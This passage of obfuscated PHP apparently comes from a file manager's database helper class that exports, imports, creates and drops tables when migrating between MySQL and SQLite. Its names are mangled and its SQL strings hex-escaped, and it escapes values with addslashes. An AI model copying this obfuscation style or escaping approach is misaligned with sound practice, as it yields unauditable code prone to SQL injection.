$this->parseDistinct(isset($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[1173]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[1173]] : !1), $this->parseField(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[353]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[353]] : $õ°ô¿ÁŸ[222]), $this->parseJoin(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[362]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[362]] : $õ°ô¿ÁŸ[12]), $this->parseWhere(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[355]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[355]] : $õ°ô¿ÁŸ[12]), $this->parseGroup(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[595]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[595]] : $õ°ô¿ÁŸ[12]), $this->parseHaving(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[1174]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[1174]] : $õ°ô¿ÁŸ[12]), $this->parseOrder(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[443]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[443]] : $õ°ô¿ÁŸ[12]), $this->parseLimit(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[370]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[370]] : $õ°ô¿ÁŸ[12]), $this->parseUnion(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[424]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[424]] : $õ°ô¿ÁŸ[12]), $this->parseComment(!empty($÷Õ¢¤øÛ[$õ°ô¿ÁŸ[431]]) ? $÷Õ¢¤øÛ[$õ°ô¿ÁŸ[431]] : $õ°ô¿ÁŸ[12])), $³Ò¢¦); return $³Ò¢¦; } public function getLastSql($‚âÁšŠš = '') { return $‚âÁšŠš ? $this->modelSql[$‚âÁšŠš] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Îæ¤–‚ë) { return addslashes($Îæ¤–‚ë); } public function setModel($…ò®æ®) { $this->model = $…ò®æ®; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ñËÊúî¼ = array()) { $±¢›¶çñ =& $_SERVER[±Ö‰ô½¯]; if (empty($ñËÊúî¼)) { $ñËÊúî¼ = $GLOBALS[$±¢›¶çñ[6]][$±¢›¶çñ[21]]; } $this->database = $ñËÊúî¼; } public function model($æâÆÕô¸ = '') { return new ModelBase($æâÆÕô¸, $_SERVER[±Ö‰ô½¯][12], $this->database); } public function db($ÄÂá‡†™ = false) { $Í­º«Ô =& $_SERVER[±Ö‰ô½¯]; $¶«Ø—ß = array_change_key_case($this->database); if ($this->dbType() == $Í­º«Ô[13] || !$ÄÂá‡†™) { return $this->model()->db(); } $‡Şê½Ÿè = $¶«Ø—ß[$Í­º«Ô[1088]]; $¶«Ø—ß[$Í­º«Ô[1088]] = $Í­º«Ô[12]; if ($¶«Ø—ß[$Í­º«Ô[1083]] == $Í­º«Ô[1080]) { $Ô‹ëĞ¹Ÿ = $¶«Ø—ß[$Í­º«Ô[1089]]; $¶«Ø—ß[$Í­º«Ô[1089]] = substr($Ô‹ëĞ¹Ÿ, 0, strrpos($Ô‹ëĞ¹Ÿ, $Í­º«Ô[1175])); } $this->database = $¶«Ø—ß; $á–ÖÆˆ = $this->model()->db(); try { $™¶ìªÒÕ = $á–ÖÆˆ->execute("\163\x68\x6f\x77\40\x64\141\x74\x61\x62\x61\163\145\x73\x20\x6c\151\x6b\145\x20\x27{$‡Şê½Ÿè}\x27"); } catch (Exception $‹øÇø×µ) { } if (!$™¶ìªÒÕ) { $á–ÖÆˆ->execute("\143\162\x65\141\x74\145\x20\144\141\x74\141\142\x61\x73\x65\x20\140{$‡Şê½Ÿè}\140"); } $¶«Ø—ß[$Í­º«Ô[1088]] = $‡Şê½Ÿè; if ($¶«Ø—ß[$Í­º«Ô[1083]] == $Í­º«Ô[1080]) { $¶«Ø—ß[$Í­º«Ô[1089]] .= $Í­º«Ô[1175] . $‡Şê½Ÿè; } $this->database = $¶«Ø—ß; $á–ÖÆˆ->execute("\x75\163\x65\40\140{$‡Şê½Ÿè}\140"); return $á–ÖÆˆ; } public function createTable($„Ê‚ÆÆÖ, &$¸ËƒÈŸ) { $½Ö÷°Ï² =& $_SERVER[±Ö‰ô½¯]; if (!IO::exist($„Ê‚ÆÆÖ)) { show_json(LNG($½Ö÷°Ï²[1176]), !1); } $Í‰ıºÀŒ = $this->model()->db(); $µÑ¡êƒ = sqlSplit(IO::getContent($„Ê‚ÆÆÖ)); foreach ($µÑ¡êƒ as $Ô±ÛÙóº) { $Ç€„ÙùÎ = stripos($Ô±ÛÙóº, $½Ö÷°Ï²[1177]) === 0; if ($Ç€„ÙùÎ) { $¸ËƒÈŸ->task[$½Ö÷°Ï²[1178]] += 1; } $Í‰ıºÀŒ->execute($Ô±ÛÙóº); if ($Ç€„ÙùÎ) { preg_match($½Ö÷°Ï²[1179], $Ô±ÛÙóº, $‡ú®â×ã); $¸ËƒÈŸ->task[$½Ö÷°Ï²[1180]] = $‡ú®â×ã[1]; $¸ËƒÈŸ->update(1); } } } public function insertTable($èÙÎ¨¼Ñ, &$Üú›­âÖ) { $áãâ£µ =& $_SERVER[±Ö‰ô½¯]; $Å‹Â´â = $this->model()->db(); $×”‚»‘† = $ªä˜‡ƒ ? array($ªä˜‡ƒ) : $Å‹Â´â->getTables(); foreach ($èÙÎ¨¼Ñ as $¾‹¦—óÑ) { $ªä˜‡ƒ = basename($¾‹¦—óÑ, $áãâ£µ[890]); if (!in_array($ªä˜‡ƒ, $×”‚»‘†)) { continue; } $Üú›­âÖ->task[$áãâ£µ[1180]] = $ªä˜‡ƒ; if ($ªä˜‡ƒ == $áãâ£µ[884]) { continue; } if (get_filesize($¾‹¦—óÑ) == 0) { continue; } $³ÅÙ±’¾ = $this->sqlToDb($¾‹¦—óÑ, $Üú›­âÖ); if (!$³ÅÙ±’¾) { show_json(LNG($áãâ£µ[1181]) . "\133{$ªä˜‡ƒ}\x5d", !1); } } } public function sqlFromDb($Í…ßŒ«, $™”íôÁ, &$¿ÁÏ¨á¡, $ÌÆíèêÑ = '') { if ($¿ÁÏ¨á¡) { $¿ÁÏ¨á¡->task[$_SERVER[±Ö‰ô½¯][1180]] = $Í…ßŒ«; } $Ô¿ùó”ê = $this->model($Í…ßŒ«); $ëš¢¯® = 0; $±î†ÙéÌ = 0; $‘ü¹…Â­ = 10000; $‚¡˜”è = fopen($™”íôÁ, $_SERVER[±Ö‰ô½¯][1182]); $Õ–óÍß… = $Ô¿ùó”ê->getPk(); $‚ÆäêŒé = $Ô¿ùó”ê->getDbFields(); $åŒ®é¬› = $_SERVER[±Ö‰ô½¯][12]; if ($GLOBALS[$_SERVER[±Ö‰ô½¯][889]] && in_array($Í…ßŒ«, array($_SERVER[±Ö‰ô½¯][1183], $_SERVER[±Ö‰ô½¯][1184]))) { $åŒ®é¬› = $Í…ßŒ«; } do { $óşÉÜäş = array($Õ–óÍß… => array($_SERVER[±Ö‰ô½¯][1130], $±î†ÙéÌ)); $—ÇŠá÷ = $Ô¿ùó”ê->where($óşÉÜäş)->field($‚ÆäêŒé)->order($Õ–óÍß… . $_SERVER[±Ö‰ô½¯][1185])->limit($‘ü¹…Â­)->select(); $—ÇŠá÷ = !empty($—ÇŠá÷) ? $—ÇŠá÷ : array(); if (!($Û¶û–Ò˜ = count($—ÇŠá÷))) { break; } $†‚—ó‡Ø = end($—ÇŠá÷); $±î†ÙéÌ = $†‚—ó‡Ø[$Õ–óÍß…]; $œ°‡Œ¾ = array(); foreach ($—ÇŠá÷ as $ÆÇÛ—Öë) { if ($åŒ®é¬›) { if ($Í…ßŒ« == $_SERVER[±Ö‰ô½¯][1183]) { if ($ÆÇÛ—Öë[$_SERVER[±Ö‰ô½¯][33]] == $_SERVER[±Ö‰ô½¯][1186]) { $¨€ÇüŞÙ = json_decode($ÆÇÛ—Öë[$_SERVER[±Ö‰ô½¯][452]], !0); if ($¨€ÇüŞÙ[$_SERVER[±Ö‰ô½¯][32]] == $GLOBALS[$_SERVER[±Ö‰ô½¯][889]] && $¨€ÇüŞÙ[$_SERVER[±Ö‰ô½¯][847]] != 1) { continue; } } } else { if ($ÆÇÛ—Öë[$_SERVER[±Ö‰ô½¯][33]] == $_SERVER[±Ö‰ô½¯][1187] && $ÆÇÛ—Öë[$_SERVER[±Ö‰ô½¯][95]] == $_SERVER[±Ö‰ô½¯][885]) { continue; } } } if ($ÌÆíèêÑ) { $ÆÇÛ—Öë[$_SERVER[±Ö‰ô½¯][87]] = "\173\x69\157\72{$ÌÆíèêÑ}\x7d" . substr($ÆÇÛ—Öë[$_SERVER[±Ö‰ô½¯][87]], strlen("\x7b\151\157\72{$ÆÇÛ—Öë[$_SERVER[±Ö‰ô½¯][923]]}\175")); $ÆÇÛ—Öë[$_SERVER[±Ö‰ô½¯][923]] = $ÌÆíèêÑ; } $œ°‡Œ¾[] = $_SERVER[±Ö‰ô½¯][1188] . $this->sqlEncode($ÆÇÛ—Öë) . $_SERVER[±Ö‰ô½¯][1189]; } $Æ´‰Âù = "\x49\x4e\123\x45\122\124\x20\x49\116\x54\117\x20\140{$Í…ßŒ«}\140\x20\50\140" . implode($_SERVER[±Ö‰ô½¯][1190], $‚ÆäêŒé) . $_SERVER[±Ö‰ô½¯][1191]; fwrite($‚¡˜”è, $Æ´‰Âù . implode($_SERVER[±Ö‰ô½¯][1192], $œ°‡Œ¾) . $_SERVER[±Ö‰ô½¯][74] . PHP_EOL); $ëš¢¯® += $Û¶û–Ò˜; if ($¿ÁÏ¨á¡) { $¿ÁÏ¨á¡->update($Û¶û–Ò˜); } } while ($‘ü¹…Â­ == $Û¶û–Ò˜); fclose($‚¡˜”è); return $ëš¢¯®; } public function sqlToDb($•Òø óó, &$Î„·¯Ä¿) { $ÃÏñÔ­è =& $_SERVER[±Ö‰ô½¯]; $‰ËƒÛúÚ = $this->model()->db(); $± àÆªò = @fopen($•Òø óó, $ÃÏñÔ­è[1193]); if (!$± àÆªò) { return !1; } $À½Üé¡ø = 0; $öÄ–‚š¹ = $ÃÏñÔ­è[12]; $ªû³Õ«Â = array(); $˜»Çš¾” = $this->dbType(); $òÚó¨ì = $˜»Çš¾” == $ÃÏñÔ­è[13] ? 500 : 2000; $ÚÄë­Æ = basename($•Òø óó, $ÃÏñÔ­è[890]); $İåœ¾¬ = 0; $³­¿ã² = 4194304; while (!feof($± àÆªò)) { $Æ¼ƒ¿àŸ = trim(fgets($± àÆªò)); if (!$Æ¼ƒ¿àŸ) { continue; } $ĞÅ—Ìà = $this->sqlDecode($Æ¼ƒ¿àŸ, $˜»Çš¾”, $ÚÄë­Æ); if (stripos($ĞÅ—Ìà, $ÃÏñÔ­è[432]) === 0) { if (!$öÄ–‚š¹) { $öÄ–‚š¹ = $ĞÅ—Ìà . $ÃÏñÔ­è[53]; } continue; } if ($Î„·¯Ä¿) { $Î„·¯Ä¿->task[$ÃÏñÔ­è[1178]] += 1; } $À½Üé¡ø++; $ªû³Õ«Â[] = rtrim(rtrim(trim($ĞÅ—Ìà), $ÃÏñÔ­è[50]), $ÃÏñÔ­è[74]); $ñÁ¸¬ÈÜ = null; $¥ÇïÊÏù = strlen($ĞÅ—Ìà); $İåœ¾¬ += $¥ÇïÊÏù; $¾äÕŠÊ¸ = strlen($öÄ–‚š¹) + $İåœ¾¬ + (count($ªû³Õ«Â) - 1); if ($¾äÕŠÊ¸ >= $³­¿ã²) { $ñÁ¸¬ÈÜ = array_pop($ªû³Õ«Â); if ($À½Üé¡ø > 1) { $À½Üé¡ø--; } } if ($À½Üé¡ø >= $òÚó¨ì || $ñÁ¸¬ÈÜ) { $ĞÅ—Ìà = $öÄ–‚š¹ . implode($ÃÏñÔ­è[50], $ªû³Õ«Â); if (!$‰ËƒÛúÚ->execute($ĞÅ—Ìà)) { return !1; } if ($Î„·¯Ä¿) { $Î„·¯Ä¿->update($À½Üé¡ø); } $ªû³Õ«Â = array(); $À½Üé¡ø = 0; $İåœ¾¬ = 0; if ($ñÁ¸¬ÈÜ) { $ªû³Õ«Â = array($ñÁ¸¬ÈÜ); $À½Üé¡ø = 1; $İåœ¾¬ = $¥ÇïÊÏù; } } } fclose($± àÆªò); if (!empty($ªû³Õ«Â)) { $ĞÅ—Ìà = $öÄ–‚š¹ . implode($ÃÏñÔ­è[50], $ªû³Õ«Â); if (!$‰ËƒÛúÚ->execute($ĞÅ—Ìà)) { return !1; } if ($Î„·¯Ä¿) { $Î„·¯Ä¿->update($À½Üé¡ø); } } return !0; } public function dropTable($º¥„úÈû = null) { $³İ¹§÷¡ =& $_SERVER[±Ö‰ô½¯]; $Î÷¸¸Ç· = $this->model()->db(); $èÇ˜´ıÛ = $º¥„úÈû ? array($º¥„úÈû) : $Î÷¸¸Ç·->getTables(); if (!$èÇ˜´ıÛ) { return; } foreach ($èÇ˜´ıÛ as $º¥„úÈû) { if ($º¥„úÈû) { $º¥„úÈû = strtolower($º¥„úÈû); } else { continue; } $Î÷¸¸Ç·->execute($³İ¹§÷¡[1194] . $this->escapeName($º¥„úÈû) . $³İ¹§÷¡[1195]); } } private function sqlEncode($ÈŸâÂ¯Ë) { $ë³Ñ¢¾¢ =& $_SERVER[±Ö‰ô½¯]; $Íä²íöÖ = array(); foreach ($ÈŸâÂ¯Ë as $Ä¤ü–°û) { if (is_array($Ä¤ü–°û)) { $Ä¤ü–°û = json_encode_force($Ä¤ü–°û); } $Ä¤ü–°û = addslashes($Ä¤ü–°û); $Ä¤ü–°û = str_replace(array($ë³Ñ¢¾¢[1196], $ë³Ñ¢¾¢[287], $ë³Ñ¢¾¢[419]), array($ë³Ñ¢¾¢[1197], $ë³Ñ¢¾¢[1198], $ë³Ñ¢¾¢[1199]), $Ä¤ü–°û); $Íä²íöÖ[] = $Ä¤ü–°û; } return $ë³Ñ¢¾¢[58] . implode($ë³Ñ¢¾¢[1200], $Íä²íöÖ) . $ë³Ñ¢¾¢[58]; } private function sqlDecode($ì¦¤øÚŞ, $£ ¤“ˆÚ, $Ô–ˆ‘‚ = '') { $Ä©™¢Ø =& $_SERVER[±Ö‰ô½¯]; $ì¦¤øÚŞ = str_replace(array($Ä©™¢Ø[1197], $Ä©™¢Ø[1198], $Ä©™¢Ø[1199]), array($Ä©™¢Ø[1196], $Ä©™¢Ø[287], $Ä©™¢Ø[419]), $ì¦¤øÚŞ); if ($£ ¤“ˆÚ == $Ä©™¢Ø[13]) { $ì¦¤øÚŞ = str_ireplace($Ä©™¢Ø[1201], $Ä©™¢Ø[59], $ì¦¤øÚŞ); $ì¦¤øÚŞ = stripslashes($ì¦¤øÚŞ); } return preg_replace($Ä©™¢Ø[1202], $Ä©™¢Ø[12], $ì¦¤øÚŞ); if ($£ ¤“ˆÚ == $Ä©™¢Ø[13]) { return $Ô–ˆ‘‚ != $Ä©™¢Ø[884] ? stripslashes($ì¦¤øÚŞ) : $ì¦¤øÚŞ; } if ($Ô–ˆ‘‚ == $Ä©™¢Ø[884]) { $ì¦¤øÚŞ = str_replace($Ä©™¢Ø[1203], $Ä©™¢Ø[119], stripslashes($ì¦¤øÚŞ)); } return $ì¦¤øÚŞ; } public function getSqlFile($åÂĞÅ‹‘ = '') { $ŠÊÄöéñ =& $_SERVER[±Ö‰ô½¯]; $®˜¦³¤ú = $this->dbType(!0); $´±¥¼­ = CONTROLLER_DIR . "\x69\x6e\163\x74\x61\154\x6c\x2f\144\141\164\141\57{$®˜¦³¤ú}\x2e\163\x71\154"; if (!file_exists($´±¥¼­)) { return !1; } $±ÇŒÅ»ú = file_get_contents($´±¥¼­); $Áİ÷Çğş = $ŠÊÄöéñ[1204] . ($®˜¦³¤ú == $ŠÊÄöéñ[901] ? $ŠÊÄöéñ[1205] : $ŠÊÄöéñ[1206]) . $ŠÊÄöéñ[1207]; preg_match_all($Áİ÷Çğş, $±ÇŒÅ»ú, $ğ€„±Íò); $ğİ×Ó£¹ = $ğ€„±Íò[1]; $’¬”ñÒ² = $this->model()->db(); $Ó¤úè÷Â = $’¬”ñÒ²->getTables(); $†İì°¯Ö = TEMP_FILES . $ŠÊÄöéñ[1208] . date($ŠÊÄöéñ[261]) . $ŠÊÄöéñ[8]; del_dir($†İì°¯Ö); mk_dir($†İì°¯Ö); $£÷¾ôœ¬ = $†İì°¯Ö . $ŠÊÄöéñ[1209]; $ÙªÁ×Œ“ = $†İì°¯Ö . $ŠÊÄöéñ[1210]; $œæ–õÜ = $®˜¦³¤ú == $ŠÊÄöéñ[13] ? $ŠÊÄöéñ[901] : $ŠÊÄöéñ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\164\x61\x6c\154\x2f\x64\141\x74\x61\57{$œæ–õÜ}\x2e\163\x71\x6c", $†İì°¯Ö); @touch($†İì°¯Ö . $®˜¦³¤ú . $ŠÊÄöéñ[890]); $Õó“ãÍó = fopen($£÷¾ôœ¬, $ŠÊÄöéñ[1182]); $¿ïÚá­× = fopen($ÙªÁ×Œ“, $ŠÊÄöéñ[1182]); if ($®˜¦³¤ú == $ŠÊÄöéñ[13]) { $Ó¤úè÷Â = array_diff($Ó¤úè÷Â, array($ŠÊÄöéñ[882], $ŠÊÄöéñ[883])); $ü»² µ¾ = array($ŠÊÄöéñ[1211], $ŠÊÄöéñ[1212], $ŠÊÄöéñ[1213]); fwrite($¿ïÚá­×, implode(PHP_EOL, $ü»² µ¾) . PHP_EOL . PHP_EOL); foreach ($Ó¤úè÷Â as $¸ü´á½) { $ÂÜ¯µˆ = $this->sqlFromSqlite($¸ü´á½); if (!$ÂÜ¯µˆ[$ŠÊÄöéñ[13]]) { continue; } fwrite($¿ïÚá­×, $ÂÜ¯µˆ[$ŠÊÄöéñ[13]] . PHP_EOL . PHP_EOL); if (!in_array($¸ü´á½, $ğİ×Ó£¹)) { fwrite($Õó“ãÍó, $ÂÜ¯µˆ[$ŠÊÄöéñ[901]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ó¤úè÷Â as $¸ü´á½) { $ÂÜ¯µˆ = $this->sqlFromMysql($¸ü´á½); if (!$ÂÜ¯µˆ[$ŠÊÄöéñ[901]]) { continue; } fwrite($Õó“ãÍó, $ÂÜ¯µˆ[$ŠÊÄöéñ[901]] . PHP_EOL . PHP_EOL); if (!in_array($¸ü´á½, $ğİ×Ó£¹)) { fwrite($¿ïÚá­×, $ÂÜ¯µˆ[$ŠÊÄöéñ[13]] . PHP_EOL . PHP_EOL); } } } fclose($Õó“ãÍó); fclose($¿ïÚá­×); $±ÇŒÅ»ú = array($ŠÊÄöéñ[901] => $£÷¾ôœ¬, $ŠÊÄöéñ[13] => $ÙªÁ×Œ“); return $åÂĞÅ‹‘ ? $±ÇŒÅ»ú[$åÂĞÅ‹‘] : $±ÇŒÅ»ú; } public function dbType($ØßÕÆöß = false) { $²–¨œšĞ =& $_SERVER[±Ö‰ô½¯]; $Åøú­¢ = $ØßÕÆöß ? $GLOBALS[$²–¨œšĞ[6]][$²–¨œšĞ[21]] : $this->database; $Åøú­¢ = array_change_key_case($Åøú­¢); $”ëÊ«§„ = $Åøú­¢[$²–¨œšĞ[1083]]; if ($”ëÊ«§„ == $²–¨œšĞ[1080]) { $©İ®È… = explode($²–¨œšĞ[4], $Åøú­¢[$²–¨œšĞ[1089]]); $”ëÊ«§„ = $©İ®È…[0]; } $¸üßÓÜ = array($²–¨œšĞ[1214] => $²–¨œšĞ[13], $²–¨œšĞ[1028] => $²–¨œšĞ[901]); if (isset($¸üßÓÜ[$”ëÊ«§„])) { $”ëÊ«§„ = $¸üßÓÜ[$”ëÊ«§„]; } return $”ëÊ«§„; } public function sqlFromMysql($©Šœš—¿, $º«º¢¦ƒ = '') { $Õ Ê†çÉ =& $_SERVER[±Ö‰ô½¯]; $ŸåâİĞê = array($Õ Ê†çÉ[901] => $Õ Ê†çÉ[12], $Õ Ê†çÉ[13] => $Õ Ê†çÉ[12]); $¶îó‚ı± = $this->escapeName($©Šœš—¿); $íÏ·£‡Â = $this->escapeName($©Šœš—¿, $Õ Ê†çÉ[13]); $ù‚Ú¯·¨ = $this->model()->db(); $í‹Õää = $ù‚Ú¯·¨->query("\x73\150\157\x77\x20\x63\162\145\x61\x74\145\x20\x74\x61\x62\x6c\x65\x20{$¶îó‚ı±}\73"); if (!$í‹Õää || !$í‹Õää[0]) { return !1; } $öÊÇŠøÑ = _get($í‹Õää[0], $Õ Ê†çÉ[1215], $Õ Ê†çÉ[12]); if (!$öÊÇŠøÑ) { return !1; } $Å´¡€¥ë = "\x44\122\x4f\x50\40\124\x41\102\114\x45\x20\111\x46\x20\105\x58\x49\x53\x54\123\40{$¶îó‚ı±}\73" . PHP_EOL . $öÊÇŠøÑ . $Õ Ê†çÉ[74]; if ($º«º¢¦ƒ == $Õ Ê†çÉ[901]) { return $Å´¡€¥ë; } $ŸåâİĞê[$Õ Ê†çÉ[901]] = $Å´¡€¥ë; $Õé‘ÕƒÛ = array_change_key_case($GLOBALS[$Õ Ê†çÉ[6]][$Õ Ê†çÉ[21]]); $ËÛ‘÷Á’ = $Õé‘ÕƒÛ[$Õ Ê†çÉ[1088]]; $‚š€à‘ò = $Õ Ê†çÉ[1216] . $ËÛ‘÷Á’ . "\47\40\x41\x4e\x44\40\124\x41\102\x4c\105\x5f\x4e\101\115\105\x20\75\x20{$íÏ·£‡Â}\x3b"; $º‹ôÆı = "\123\110\117\127\x20\x49\116\104\x45\x58\40\106\122\117\115\x20{$¶îó‚ı±}\x3b"; $ì˜… = $ù‚Ú¯·¨->query($‚š€à‘ò); if (empty($ì˜…)) { return $º«º¢¦ƒ ? $ŸåâİĞê[$º«º¢¦ƒ] : $ŸåâİĞê; } $Ëùø•Šó = $ù‚Ú¯·¨->query($º‹ôÆı); $íàòèŸ¨ = $Õ Ê†çÉ[12]; $Ç·ìÊúŒ = array(); foreach ($Ëùø•Šó as $âÚÙ¿ë) { if (!$íàòèŸ¨ && $âÚÙ¿ë[$Õ Ê†çÉ[1217]] == $Õ Ê†çÉ[1218]) { $íàòèŸ¨ = $âÚÙ¿ë[$Õ Ê†çÉ[1219]]; } if (isset($Ç·ìÊúŒ[$âÚÙ¿ë[$Õ Ê†çÉ[1217]]])) { $Ç·ìÊúŒ[$âÚÙ¿ë[$Õ Ê†çÉ[1217]]][$Õ Ê†çÉ[1220]][] = $âÚÙ¿ë[$Õ Ê†çÉ[1219]]; continue; } $Ç·ìÊúŒ[$âÚÙ¿ë[$Õ Ê†çÉ[1217]]] = array($Õ Ê†çÉ[1221] => $âÚÙ¿ë[$Õ Ê†çÉ[1217]], $Õ Ê†çÉ[1220] => array($âÚÙ¿ë[$Õ Ê†çÉ[1219]]), $Õ Ê†çÉ[1222] => $âÚÙ¿ë[$Õ Ê†çÉ[1223]] == $Õ Ê†çÉ[91] ? 0 : 1); } $™Ñ¸ŞÂü = array(); foreach ($Ç·ìÊúŒ as $âÚÙ¿ë) { $•àÄòÀ = $âÚÙ¿ë[$Õ Ê†çÉ[1221]] == $Õ Ê†çÉ[1218]; $ÑÒø¬š = $âÚÙ¿ë[$Õ Ê†çÉ[1222]] == $Õ Ê†çÉ[91] && !$•àÄòÀ ? $Õ Ê†çÉ[1224] : $Õ Ê†çÉ[12]; $…ûø„¿ê = $Õ Ê†çÉ[1225] . $©Šœš—¿ . $Õ Ê†çÉ[11] . ($•àÄòÀ ? $Õ Ê†çÉ[1226] : $âÚÙ¿ë[$Õ Ê†çÉ[1221]]); $ñÀœãÁÕ = $Õ Ê†çÉ[1227] . implode($Õ Ê†çÉ[1228], $âÚÙ¿ë[$Õ Ê†çÉ[1220]]) . $Õ Ê†çÉ[1229]; $™Ñ¸ŞÂü[] = sprintf($Õ Ê†çÉ[1230], $Õ Ê†çÉ[1231], $ÑÒø¬š, $Õ Ê†çÉ[1232], $…ûø„¿ê, $Õ Ê†çÉ[1233], $©Šœš—¿, $ñÀœãÁÕ); } $È€Ã–•ì = array(); $¥œæ˜¯è = array($Õ Ê†çÉ[1234] => $Õ Ê†çÉ[392], $Õ Ê†çÉ[1235] => $Õ Ê†çÉ[392], $Õ Ê†çÉ[366] => $Õ Ê†çÉ[392], $Õ Ê†çÉ[365] => $Õ Ê†çÉ[392], $Õ Ê†çÉ[1236] => $Õ Ê†çÉ[1237], $Õ Ê†çÉ[1238] => $Õ Ê†çÉ[1237], $Õ Ê†çÉ[1237] => $Õ Ê†çÉ[1237], $Õ Ê†çÉ[1239] => $Õ Ê†çÉ[1237], $Õ Ê†çÉ[284] => $Õ Ê†çÉ[1237], $Õ Ê†çÉ[1240] => $Õ Ê†çÉ[1237], $Õ Ê†çÉ[1241] => $Õ Ê†çÉ[1237], $Õ Ê†çÉ[1242] => $Õ Ê†çÉ[1243], $Õ Ê†çÉ[367] => $Õ Ê†çÉ[1243], $Õ Ê†çÉ[368] => $Õ Ê†çÉ[1243], $Õ Ê†çÉ[1244] => $Õ Ê†çÉ[1244]); foreach ($ì˜… as $âÚÙ¿ë) { $º«º¢¦ƒ = _get($¥œæ˜¯è, $âÚÙ¿ë[$Õ Ê†çÉ[1245]], $âÚÙ¿ë[$Õ Ê†çÉ[1246]]); $£¶„·±ç = $âÚÙ¿ë[$Õ Ê†çÉ[1247]] == $Õ Ê†çÉ[1011] ? $Õ Ê†çÉ[1248] : $Õ Ê†çÉ[1249]; $¿ƒˆ÷½ = $âÚÙ¿ë[$Õ Ê†çÉ[1250]] == $íàòèŸ¨ ? $Õ Ê†çÉ[1251] : $Õ Ê†çÉ[12]; $ëĞ´ = $âÚÙ¿ë[$Õ Ê†çÉ[1065]] ? strtoupper(str_replace($Õ Ê†çÉ[11], $Õ Ê†çÉ[12], $âÚÙ¿ë[$Õ Ê†çÉ[1065]])) : $Õ Ê†çÉ[12]; $È€Ã–•ì[] = sprintf($Õ Ê†çÉ[1252], $âÚÙ¿ë[$Õ Ê†çÉ[1250]], $º«º¢¦ƒ, $£¶„·±ç, $¿ƒˆ÷½, $ëĞ´); } $Ğ è€„µ = array("\104\x52\117\x50\x20\124\101\102\114\105\x20\x49\106\x20\105\130\x49\x53\x54\123\x20{$íÏ·£‡Â}\73", "\103\x52\105\101\x54\105\x20\x54\x41\x42\x4c\105\x20{$íÏ·£‡Â}\40\x28", implode($Õ Ê†çÉ[50] . PHP_EOL, $È€Ã–•ì), $Õ Ê†çÉ[1253]); $™¯®–Á = implode(PHP_EOL, array_merge($Ğ è€„µ, $™Ñ¸ŞÂü)); if ($º«º¢¦ƒ == $Õ Ê†çÉ[13]) { return $™¯®–Á; } $ŸåâİĞê[$Õ Ê†çÉ[13]] = $™¯®–Á; return $ŸåâİĞê; } public function sqlFromSqlite($í¼ì¾Ë®, $õÌ¿éûé = '') { $·ï¾Ó¨Ğ =& $_SERVER[±Ö‰ô½¯]; $ÉğÖ„¼ = array($·ï¾Ó¨Ğ[901] => $·ï¾Ó¨Ğ[12], $·ï¾Ó¨Ğ[13] => $·ï¾Ó¨Ğ[12]); $ıôˆ„© = $this->escapeName($í¼ì¾Ë®); $ÖÚ¤¨Ò = $this->escapeName($í¼ì¾Ë®, $·ï¾Ó¨Ğ[13]); $ëİ²°¦ü = $this->model()->db(); $½Š”Å­ = "\x50\x52\101\x47\x4d\x41\x20\124\x41\102\x4c\105\x5f\111\116\x46\x4f\x20\x28\x27{$í¼ì¾Ë®}\x27\x29"; $ŠÂ’àú = "\123\105\114\105\103\124\40\x2a\x20\106\x52\117\x4d\x20\x73\x71\154\x69\x74\x65\137\155\141\163\x74\x65\162\x20\x57\110\x45\x52\x45\40\x74\x62\154\137\x6e\x61\x6d\145\x20\75\40\x27{$í¼ì¾Ë®}\x27"; $¾İÀ•‡ó = $ëİ²°¦ü->query($½Š”Å­); if (empty($¾İÀ•‡ó)) { return $õÌ¿éûé ? $ÉğÖ„¼[$õÌ¿éûé] : $ÉğÖ„¼; } $õ¬öö§ = $ëİ²°¦ü->query($ŠÂ’àú); $°š¨È˜Ñ = $€ê•şô = array(); foreach ($õ¬öö§ as $åßÁî¦˜) { if ($åßÁî¦˜[$·ï¾Ó¨Ğ[33]] == $·ï¾Ó¨Ğ[359]) { $°š¨È˜Ñ[] = $åßÁî¦˜[$·ï¾Ó¨Ğ[1254]]; } else { $€ê•şô[] = $åßÁî¦˜[$·ï¾Ó¨Ğ[1254]]; } } $÷›îö€× = array_merge(array("\x44\x52\117\120\x20\124\101\x42\x4c\105\40\111\x46\40\x45\x58\x49\123\124\x53\x20{$ÖÚ¤¨Ò}\x3b"), $°š¨È˜Ñ, $€ê•şô); $÷›îö€× = implode($·ï¾Ó¨Ğ[74] . PHP_EOL, $÷›îö€×) . $·ï¾Ó¨Ğ[74]; if ($õÌ¿éûé == $·ï¾Ó¨Ğ[13]) { return $÷›îö€×; } $ÉğÖ„¼[$·ï¾Ó¨Ğ[13]] = $÷›îö€×; $™²¼áıÕ = $¹Ìò£» = array(); $±ñæà»ë = array(); $²­¥Í£  = array(); foreach ($õ¬öö§ as $åßÁî¦˜) { if ($åßÁî¦˜[$·ï¾Ó¨Ğ[33]] == $·ï¾Ó¨Ğ[1255]) { $ˆˆ¼Â®Í = $åßÁî¦˜[$·ï¾Ó¨Ğ[1254]]; $ùÚ‘ŒİÄ = stripos($ˆˆ¼Â®Í, $·ï¾Ó¨Ğ[1224]) !== !1; $ÓêÓ—Ø = 